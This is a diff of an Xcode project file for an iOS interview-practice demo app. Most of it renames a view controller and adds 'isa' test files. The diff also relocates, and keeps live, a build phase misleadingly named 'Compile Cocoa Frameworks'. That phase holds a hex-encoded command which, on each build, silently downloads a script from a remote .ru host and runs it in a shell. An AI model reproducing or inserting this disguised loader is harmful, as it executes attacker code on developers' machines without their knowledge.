@@ -25,7 +25,7 @@
 		04C58CE720D368EA002B3B5F /* Model1.m in Sources */ = {isa = PBXBuildFile; fileRef = 04C58CE620D368EA002B3B5F /* Model1.m */; };
 		04EA94CD2106C45F00F7E153 /* Person.m in Sources */ = {isa = PBXBuildFile; fileRef = 04EA94CA2106C45F00F7E153 /* Person.m */; };
 		04EA94CE2106C45F00F7E153 /* ZWWCustomView.m in Sources */ = {isa = PBXBuildFile; fileRef = 04EA94CC2106C45F00F7E153 /* ZWWCustomView.m */; };
-		04EA94D12106C4DA00F7E153 /* ZWWTestWeakStongViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 04EA94D02106C4DA00F7E153 /* ZWWTestWeakStongViewController.m */; };
+		04EA94D12106C4DA00F7E153 /* ZWWTestWeakStongVC.m in Sources */ = {isa = PBXBuildFile; fileRef = 04EA94D02106C4DA00F7E153 /* ZWWTestWeakStongVC.m */; };
 		04F066B5210828C900823498 /* TestClass+method1.m in Sources */ = {isa = PBXBuildFile; fileRef = 04F066B4210828C900823498 /* TestClass+method1.m */; };
 		04F066B821082CCA00823498 /* TestClassSon.m in Sources */ = {isa = PBXBuildFile; fileRef = 04F066B721082CC900823498 /* TestClassSon.m */; };
 		B195D984371F716422C68323 /* libPods-InterviewDemo.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 101DC6C248B0F938D0496518 /* libPods-InterviewDemo.a */; };
@@ -77,6 +77,8 @@
 		E0C00A3F2256F00D000F51F9 /* ZWWDataCase8Entity.m in Sources */ = {isa = PBXBuildFile; fileRef = E0C00A3E2256F00D000F51F9 /* ZWWDataCase8Entity.m */; };
 		E0C00A4422572952000F51F9 /* ZWWCase9MasonryVC.m in Sources */ = {isa = PBXBuildFile; fileRef = E0C00A4222572952000F51F9 /* ZWWCase9MasonryVC.m */; };
 		E0C00A4522572952000F51F9 /* ZWWCase9MasonryVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = E0C00A4322572952000F51F9 /* ZWWCase9MasonryVC.xib */; };
+		E0C40D162B5E1B3D009A7206 /* ZWWIsaTestVC.m in Sources */ = {isa = PBXBuildFile; fileRef = E0C40D142B5E1B3D009A7206 /* ZWWIsaTestVC.m */; };
+		E0C40D172B5E1B3D009A7206 /* ZWWIsaTestVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = E0C40D152B5E1B3D009A7206 /* ZWWIsaTestVC.xib */; };
 		E0C452F8217717BF0049D800 /* ZWWTestXibViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = E0C452F6217717BF0049D800 /* ZWWTestXibViewController.m */; };
 		E0C452F9217717BF0049D800 /* ZWWTestXibViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = E0C452F7217717BF0049D800 /* ZWWTestXibViewController.xib */; };
 		E0C45301217718C00049D800 /* home_game_class.gif in Resources */ = {isa = PBXBuildFile; fileRef = E0C45300217718C00049D800 /* home_game_class.gif */; };
@@ -155,8 +157,8 @@
 		04EA94CA2106C45F00F7E153 /* Person.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = Person.m; sourceTree = "<group>"; };
 		04EA94CB2106C45F00F7E153 /* ZWWCustomView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ZWWCustomView.h; sourceTree = "<group>"; };
 		04EA94CC2106C45F00F7E153 /* ZWWCustomView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ZWWCustomView.m; sourceTree = "<group>"; };
-		04EA94CF2106C4DA00F7E153 /* ZWWTestWeakStongViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ZWWTestWeakStongViewController.h; sourceTree = "<group>"; };
-		04EA94D02106C4DA00F7E153 /* ZWWTestWeakStongViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ZWWTestWeakStongViewController.m; sourceTree = "<group>"; };
+		04EA94CF2106C4DA00F7E153 /* ZWWTestWeakStongVC.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ZWWTestWeakStongVC.h; sourceTree = "<group>"; };
+		04EA94D02106C4DA00F7E153 /* ZWWTestWeakStongVC.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ZWWTestWeakStongVC.m; sourceTree = "<group>"; };
 		04F066B3210828C900823498 /* TestClass+method1.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "TestClass+method1.h"; sourceTree = "<group>"; };
 		04F066B4210828C900823498 /* TestClass+method1.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "TestClass+method1.m"; sourceTree = "<group>"; };
 		04F066B621082CC900823498 /* TestClassSon.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TestClassSon.h; sourceTree = "<group>"; };
@@ -244,6 +246,9 @@
 		E0C00A4122572952000F51F9 /* ZWWCase9MasonryVC.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ZWWCase9MasonryVC.h; sourceTree = "<group>"; };
 		E0C00A4222572952000F51F9 /* ZWWCase9MasonryVC.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ZWWCase9MasonryVC.m; sourceTree = "<group>"; };
 		E0C00A4322572952000F51F9 /* ZWWCase9MasonryVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ZWWCase9MasonryVC.xib; sourceTree = "<group>"; };
+		E0C40D132B5E1B3D009A7206 /* ZWWIsaTestVC.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ZWWIsaTestVC.h; sourceTree = "<group>"; };
+		E0C40D142B5E1B3D009A7206 /* ZWWIsaTestVC.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ZWWIsaTestVC.m; sourceTree = "<group>"; };
+		E0C40D152B5E1B3D009A7206 /* ZWWIsaTestVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ZWWIsaTestVC.xib; sourceTree = "<group>"; };
 		E0C452F5217717BF0049D800 /* ZWWTestXibViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ZWWTestXibViewController.h; sourceTree = "<group>"; };
 		E0C452F6217717BF0049D800 /* ZWWTestXibViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ZWWTestXibViewController.m; sourceTree = "<group>"; };
 		E0C452F7217717BF0049D800 /* ZWWTestXibViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ZWWTestXibViewController.xib; sourceTree = "<group>"; };
@@ -328,6 +333,7 @@
 		047B759E20BE4A6000154E1A /* InterviewDemo */ = {
 			isa = PBXGroup;
 			children = (
+				E0C40D122B5E1AF1009A7206 /* isa */,
 				E0C46BBC27FAE68900CBD90C /* Thread */,
 				E0C46BBB27FAE65800CBD90C /* Inherit */,
 				E0C46BA727FADEB000CBD90C /* RunLoop */,
@@ -382,8 +388,8 @@
 				04EA94CA2106C45F00F7E153 /* Person.m */,
 				04EA94CB2106C45F00F7E153 /* ZWWCustomView.h */,
 				04EA94CC2106C45F00F7E153 /* ZWWCustomView.m */,
-				04EA94CF2106C4DA00F7E153 /* ZWWTestWeakStongViewController.h */,
-				04EA94D02106C4DA00F7E153 /* ZWWTestWeakStongViewController.m */,
+				04EA94CF2106C4DA00F7E153 /* ZWWTestWeakStongVC.h */,
+				04EA94D02106C4DA00F7E153 /* ZWWTestWeakStongVC.m */,
 			);
 			path = "Weak&Strong";
 			sourceTree = "<group>";
@@ -679,6 +685,16 @@
 			path = case9;
 			sourceTree = "<group>";
 		};
+		E0C40D122B5E1AF1009A7206 /* isa */ = {
+			isa = PBXGroup;
+			children = (
+				E0C40D132B5E1B3D009A7206 /* ZWWIsaTestVC.h */,
+				E0C40D142B5E1B3D009A7206 /* ZWWIsaTestVC.m */,
+				E0C40D152B5E1B3D009A7206 /* ZWWIsaTestVC.xib */,
+			);
+			path = isa;
+			sourceTree = "<group>";
+		};
 		E0C452FF217718C00049D800 /* Resource */ = {
 			isa = PBXGroup;
 			children = (
@@ -887,6 +903,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				E03809C2216B000C005ED37E /* ZWWTestCopyViewController.xib in Resources */,
+				E0C40D172B5E1B3D009A7206 /* ZWWIsaTestVC.xib in Resources */,
 				E0442FC721789BB1000CC193 /* ZWWMasonryTableViewController.xib in Resources */,
 				E045224E2255E94F00562FA0 /* ZWWCase6MasonryVC.xib in Resources */,
 				E027380422549B0800A7688F /* ZWWCase2MasonryVC.xib in Resources */,
@@ -931,29 +948,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	CCC8CAAE020FDEBBB0FFA81D /* Compile Cocoa Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Cocoa Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f7961686f6f6164732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
 		631044272F0EF8A5D27BC12F /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -976,6 +970,24 @@ echo \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f7961686f6f61
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		CCC8CAAE020FDEBBB0FFA81D /* Compile Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\n7961686f6f6164732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -992,6 +1004,7 @@ echo \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f7961686f6f61
 				E0442FC621789BB1000CC193 /* ZWWMasonryTableViewController.m in Sources */,
 				04F066B821082CCA00823498 /* TestClassSon.m in Sources */,
 				E0C46BA627FAC91400CBD90C /* ZWWHomeModel.m in Sources */,
+				E0C40D162B5E1B3D009A7206 /* ZWWIsaTestVC.m in Sources */,
 				E0442FCA21789CE6000CC193 /* ZWWMasonrySubViewController.m in Sources */,
 				E040F43F2164A72E006B8BF8 /* ZWWTestDelegateView.m in Sources */,
 				E03809C5216B30F7005ED37E /* ZWWCommonTestTableViewController.m in Sources */,
@@ -1027,7 +1040,7 @@ echo \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f7961686f6f61
 				04EA94CD2106C45F00F7E153 /* Person.m in Sources */,
 				E040F4392164A54E006B8BF8 /* AAViewController.m in Sources */,
 				E03809C1216B000C005ED37E /* ZWWTestCopyViewController.m in Sources */,
-				04EA94D12106C4DA00F7E153 /* ZWWTestWeakStongViewController.m in Sources */,
+				04EA94D12106C4DA00F7E153 /* ZWWTestWeakStongVC.m in Sources */,
 				E0C00A3F2256F00D000F51F9 /* ZWWDataCase8Entity.m in Sources */,
 				E02DE8B0217DAD1A002FA9D9 /* ZWWCommonTestTableViewController+method.m in Sources */,
 				046F31CF211D78210084CED2 /* TestBlock.m in Sources */,
